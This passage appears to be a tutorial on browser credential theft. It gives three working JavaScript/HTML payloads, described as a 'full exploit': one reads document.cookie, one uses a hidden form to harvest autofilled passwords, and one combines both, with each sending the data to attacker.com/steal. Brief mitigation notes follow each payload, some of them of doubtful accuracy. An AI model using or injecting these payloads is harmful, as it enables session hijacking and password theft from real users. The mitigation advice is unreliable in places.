---

### **1. Extracting Cookies via JavaScript**
Cookies stored in the browser can be accessed via `document.cookie` if they are not marked as `HttpOnly`.

```javascript
// Extract all accessible cookies
const stolenCookies = document.cookie;

// Send stolen cookies to an attacker-controlled server (simulated)
fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ cookies: stolenCookies }),
    headers: { 'Content-Type': 'application/json' }
});
```

#### **Explanation:**
- `document.cookie` retrieves all cookies available to JavaScript (excluding `HttpOnly` cookies).
- The stolen cookies are sent to an attacker-controlled server using `fetch()`.

#### **Mitigation:**
- Use `HttpOnly` flag on sensitive cookies to prevent JavaScript access.
- Implement `SameSite` attributes (`Strict` or `Lax`) to prevent CSRF attacks.

---

### **2. Extracting Saved Passwords via Autofill Exploit**
Browsers auto-fill saved passwords into login forms. An attacker can exploit this by injecting hidden form fields.

```html
<!-- Hidden login form to capture autofilled credentials -->
<form id="stealPasswords" style="display: none;">
    <input type="text" name="username" autocomplete="username">
    <input type="password" name="password" autocomplete="current-password">
</form>

<script>
    // Wait for autofill to complete
    setTimeout(() => {
        const form = document.getElementById('stealPasswords');
        const username = form.username.value;
        const password = form.password.value;

        // Send stolen credentials to attacker
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: JSON.stringify({ username, password }),
            headers: { 'Content-Type': 'application/json' }
        });
    }, 1000); // Delay to allow autofill
</script>
```

#### **Explanation:**
- A hidden form with `autocomplete="username"` and `autocomplete="current-password"` tricks the browser into auto-filling credentials.
- After a delay (`setTimeout`), JavaScript extracts the values and sends them to the attacker.

#### **Mitigation:**
- Disable autofill on sensitive forms (`autocomplete="off"`).
- Educate users to avoid saving passwords in browsers for critical sites.

---

### **3. Combining Both Attacks (Full Exploit)**
A real-world attack might combine both techniques:

```javascript
// Steal cookies
const cookies = document.cookie;

// Steal autofilled passwords
const form = document.createElement('form');
form.style.display = 'none';
form.innerHTML = `
    <input type="text" name="username" autocomplete="username">
    <input type="password" name="password" autocomplete="current-password">
`;
document.body.appendChild(form);

setTimeout(() => {
    const credentials = {
        username: form.username.value,
        password: form.password.value,
        cookies: cookies
    };

    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(credentials),
        headers: { 'Content-Type': 'application/json' }
    });

    form.remove(); // Clean up
}, 1000);
```

#### **Explanation:**
- Dynamically injects a hidden form to capture credentials.
- Combines stolen cookies and credentials into a single exfiltration request.

#### **Mitigation:**
- Use **Content Security Policy (CSP)** to block unauthorized `fetch` requests.
- Implement **Subresource Integrity (SRI)** for third-party scripts.
- Educate developers on **secure coding practices** (e.g., avoiding `innerHTML`).

---

